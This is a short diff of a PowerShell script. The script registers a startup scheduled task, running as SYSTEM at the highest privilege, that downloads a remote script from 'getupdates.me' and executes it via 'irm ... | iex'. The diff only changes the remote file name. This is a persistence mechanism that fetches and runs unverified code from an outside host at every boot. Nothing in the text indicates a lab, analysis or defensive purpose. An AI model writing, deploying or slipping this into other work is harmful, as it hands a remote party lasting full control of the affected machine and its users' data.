@@ -12,6 +12,6 @@ $logFile = "$env:HOMEPATH\Documents\timestamp.txt"
 $taskName = "RunOnceAfterReboot"
 Register-ScheduledTask -TaskName $taskName `
   -Trigger (New-ScheduledTaskTrigger -AtStartup) `
-  -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Unrestricted -C irm https://getupdates.me/Part2.ps1 | iex") `
+  -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Unrestricted -C irm https://getupdates.me/test2.ps1 | iex") `
   -RunLevel Highest `
   -User "SYSTEM"
